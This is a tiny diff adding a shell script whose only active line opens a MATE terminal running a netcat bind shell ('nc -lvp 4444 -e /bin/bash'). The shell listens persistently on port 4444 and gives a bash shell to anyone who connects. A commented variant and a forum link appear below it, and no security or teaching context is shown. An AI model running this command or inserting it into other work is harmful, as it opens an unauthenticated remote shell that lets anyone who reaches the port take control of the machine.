@@ -1,0 +1,5 @@
+
+mate-terminal --window --command="nc -vv -k -lvp 4444 -e /bin/bash"
+
+#mate-terminal --window --command="nc -lvp 4444 -e /bin/bash"
+#Source: https://ubuntu-mate.community/t/open-mate-terminal-and-do-command/11200
